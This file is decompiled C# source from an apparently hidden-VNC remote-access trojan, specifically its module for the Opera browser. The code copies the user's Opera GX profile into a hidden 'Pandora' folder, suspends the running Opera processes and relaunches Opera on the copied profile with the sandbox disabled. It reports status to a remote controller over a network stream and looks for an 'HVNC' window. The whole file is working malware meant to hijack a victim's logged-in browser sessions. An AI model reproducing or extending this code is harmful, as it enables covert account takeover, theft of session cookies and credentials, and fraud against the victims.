using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DLL.Browser
{
	// Token: 0x02000007 RID: 7
	public class Opera
	{
		// Token: 0x06000052 RID: 82
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		// Token: 0x06000053 RID: 83 RVA: 0x00004AC8 File Offset: 0x00002CC8
		public static void StartOpera(bool duplicate)
		{
			try
			{
				if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("appdata") + "\\Opera\\Opera Software\\Pandora\\lockfile"))))
				{
					Outils.SendInformation(Outils.nstream, "25|Opera has already been opened!");
				}
				else
				{
					if (duplicate)
					{
						Outils.SendInformation(Outils.nstream, "22|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Opera\\Opera Software\\Opera GX Stable") / 1024.0 / 1024.0)));
						MonitorDirSize monitorDirSize = new MonitorDirSize();
						monitorDirSize.StartMonitoring(Interaction.Environ("appdata") + "\\Opera\\Opera Software\\Pandora");
						try
						{
							Outils.a.FileSystem.CopyDirectory(Interaction.Environ("appdata") + "\\Opera\\Opera Software\\Opera GX Stable", Interaction.Environ("appdata") + "\\Opera\\Opera Software\\Pandora", true);
						}
						catch (Exception ex)
						{
						}
						monitorDirSize.StopMonitoring();
						Outils.SendInformation(Outils.nstream, "211|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Opera\\Opera Software\\Opera GX Stable") / 1024.0 / 1024.0)));
					}
					else
					{
						Outils.SendInformation(Outils.nstream, "212|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Opera\\Opera Software\\Opera GX Stable") / 1024.0 / 1024.0)));
					}
					Process[] processesByName = Process.GetProcessesByName("opera");
					for (int i = 0; i < processesByName.Length; i++)
					{
						Outils.SuspendProcess(processesByName[i]);
					}
					Process.Start("opera", "--user-data-dir=\"" + Interaction.Environ("appdata") + "\\Opera\\Opera Software\\Opera GX Stable\\Pandora\" --no-sandbox --allow-no-sandbox-job --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					while (Outils.FindHandle("Welcome to HVNC !") == (IntPtr)0)
					{
						Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
						Opera.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
						Application.DoEvents();
						if (stopwatch.ElapsedMilliseconds >= 10000L)
						{
							return;
						}
					}
					stopwatch.Stop();
					processesByName = Process.GetProcessesByName("opera");
					for (int i = 0; i < processesByName.Length; i++)
					{
						Outils.ResumeProcess(processesByName[i]);
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x04000039 RID: 57
		private const short SWP_NOMOVE = 2;

		// Token: 0x0400003A RID: 58
		private const short SWP_NOSIZE = 1;

		// Token: 0x0400003B RID: 59
		private const short SWP_NOZORDER = 4;

		// Token: 0x0400003C RID: 60
		private const int SWP_SHOWWINDOW = 64;
	}
}
